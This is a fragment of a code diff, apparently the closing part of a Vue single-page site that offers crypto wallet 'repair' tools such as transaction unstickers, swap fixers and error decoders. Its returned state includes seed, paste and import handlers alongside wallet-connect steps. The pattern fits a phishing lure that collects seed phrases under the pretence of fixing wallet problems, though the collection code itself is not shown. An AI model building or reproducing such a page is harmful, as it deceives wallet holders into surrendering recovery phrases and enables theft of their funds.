+      {n:'TX Unsticker',d:'Resolve stuck & pending transactions with gas boost or cancel',bg:'var(--red-light)',ic:'var(--red)',svg:'<path d="M12 2v4m0 12v4m10-10h-4M6 12H2m15.07-7.07l-2.83 2.83M9.76 14.24l-2.83 2.83m0-10.14l2.83 2.83m4.48 4.48l2.83 2.83"/>',t:'Popular',tbg:'#FEE2E2',tc:'#DC2626'},
+      {n:'Node Manager',d:'Switch RPC endpoints, test latency & manage custom nodes',bg:'var(--blue-light)',ic:'var(--blue)',svg:'<circle cx="12" cy="12" r="3"/><path d="M12 2v4m0 8v4m8-6h-4M8 12H4"/>',t:'Advanced',tbg:'var(--blue-light)',tc:'var(--blue)'},
+      {n:'Error Decoder',d:'Decode null errors, reverts, out-of-gas & execution failures',bg:'var(--orange-light)',ic:'var(--orange)',svg:'<path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0zM12 9v4m0 4h.01"/>',t:'Essential',tbg:'var(--orange-light)',tc:'#D97706'},
+      {n:'Swap Fixer',d:'Debug failed swaps, slippage errors & DEX routing issues',bg:'var(--green-light)',ic:'var(--green)',svg:'<polyline points="17 1 21 5 17 9"/><path d="M3 11V9a4 4 0 014-4h14"/><polyline points="7 23 3 19 7 15"/><path d="M21 13v2a4 4 0 01-4 4H3"/>',t:'New',tbg:'var(--green-light)',tc:'#059669'},
+      {n:'dApp Scanner',d:'Verify contract safety, check approvals & revoke permissions',bg:'var(--purple-light)',ic:'var(--purple)',svg:'<path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>',t:'Security',tbg:'var(--purple-light)',tc:'var(--purple)'},
+      {n:'Gas Optimizer',d:'Estimate optimal gas, track network congestion in real-time',bg:'var(--cyan-light)',ic:'var(--cyan)',svg:'<path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/>',t:'Savings',tbg:'var(--cyan-light)',tc:'#0891B2'},
+    ];
+
+    const features = [
+      {title:'Multi-Chain Bridge',desc:'Seamlessly bridge assets across Ethereum, BSC, Polygon, Arbitrum, Avalanche and 50+ networks with optimized routing.',bg:'var(--blue-light)',ic:'var(--blue)',svg:'<circle cx="12" cy="12" r="10"/><path d="M2 12h20M12 2a15.3 15.3 0 014 10 15.3 15.3 0 01-4 10 15.3 15.3 0 01-4-10 15.3 15.3 0 014-10z"/>'},
+      {title:'Smart Contract Auditor',desc:'Scan any contract address for vulnerabilities, honeypots, rug-pull indicators and suspicious patterns before interaction.',bg:'var(--red-light)',ic:'var(--red)',svg:'<path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/>'},
+      {title:'Token Approval Manager',desc:'View, manage and revoke all token approvals across every chain. Stop unauthorized contracts from accessing your tokens.',bg:'var(--orange-light)',ic:'var(--orange)',svg:'<rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/>'},
+      {title:'Transaction Simulator',desc:'Preview any transaction before signing. See exact token movements, gas costs and potential errors before they happen.',bg:'var(--purple-light)',ic:'var(--purple)',svg:'<rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/>'},
+      {title:'MEV Protection',desc:'Shield your swaps from frontrunning and sandwich attacks using private transaction relays on supported networks.',bg:'var(--green-light)',ic:'var(--green)',svg:'<path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/>'},
+    ];
+
+    const problems = [
+      {t:'Stuck Transaction',d:'Speed up or cancel pending TX with nonce override',bg:'var(--red-light)',ic:'var(--red)',svg:'<circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/>',b:'Fix',bbg:'#FEE2E2',bc:'#DC2626'},
+      {t:'Null / Revert Error',d:'Decode execution failures and contract revert reasons',bg:'var(--orange-light)',ic:'var(--orange)',svg:'<path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0zM12 9v4m0 4h.01"/>',b:'Decode',bbg:'var(--orange-light)',bc:'#D97706'},
+      {t:'Swap Failed',d:'Resolve slippage, liquidity & routing errors on DEX trades',bg:'var(--purple-light)',ic:'var(--purple)',svg:'<polyline points="17 1 21 5 17 9"/><path d="M3 11V9a4 4 0 014-4h14"/><polyline points="7 23 3 19 7 15"/><path d="M21 13v2a4 4 0 01-4 4H3"/>',b:'Retry',bbg:'var(--purple-light)',bc:'var(--purple)'},
+      {t:'dApp Won\'t Connect',d:'Fix WalletConnect, injected provider & session issues',bg:'var(--blue-light)',ic:'var(--blue)',svg:'<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>',b:'Repair',bbg:'var(--blue-light)',bc:'var(--blue)'},
+      {t:'Wrong Network / Chain ID',d:'Auto-switch networks and fix mismatched chain configurations',bg:'var(--cyan-light)',ic:'var(--cyan)',svg:'<circle cx="12" cy="12" r="10"/><path d="M2 12h20M12 2a15.3 15.3 0 014 10 15.3 15.3 0 01-4 10"/>',b:'Switch',bbg:'var(--cyan-light)',bc:'#0891B2'},
+      {t:'Missing Token Balance',d:'Resync balances, add custom tokens & fix display errors',bg:'var(--green-light)',ic:'var(--green)',svg:'<line x1="12" y1="1" x2="12" y2="23"/><path d="M17 5H9.5a3.5 3.5 0 000 7h5a3.5 3.5 0 010 7H6"/>',b:'Sync',bbg:'var(--green-light)',bc:'#059669'},
+    ];
+
+    return {
+      modal,modalClosing,selW,wc,seed,swc,connectStep,connectingWallet,
+      closeModal,startConnect,doPaste,doImport,
+      wallets,stats,tickerData,tools,features,problems,
+      toast,reportType,reportMessage,selectedTool,selectedProblem,
+      sendReport,runDiagnostics,sendToolReport,reportProblem
+    };
+  }
+}).mount('#app');
+</script>
 </body>
 </html>
